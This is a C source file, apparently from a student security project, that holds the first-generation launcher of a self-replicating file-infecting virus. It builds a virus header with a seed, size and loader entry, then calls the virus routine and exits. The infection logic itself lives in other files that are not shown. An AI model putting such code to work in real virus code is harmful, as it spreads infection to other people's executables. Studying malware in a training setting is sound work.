/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   start.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 03:39:28 by agrumbac          #+#    #+#             */
/*   Updated: 2021/06/15 16:54:04 by ichkamo          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "syscall.h"
#include "virus.h"
#include "loader.h"

/*
** _start is the launcher function of the virus
**   - it is launched instead of the loader for the first run
**   - it is NOT copied into infected files (unlike the loader and virus)
*/

void	_start(void)
{
	/* 1st generation values */
	struct virus_header	vhdr = {
		.seed         = 0xfadedbade1f5eed5,
		// .seed         = 0x5555555555555555,
		.virus_size   = _start - loader_entry,
		.loader_entry = loader_entry,
	};

	virus(&vhdr);

	sys_exit(0);
	__builtin_unreachable();
}
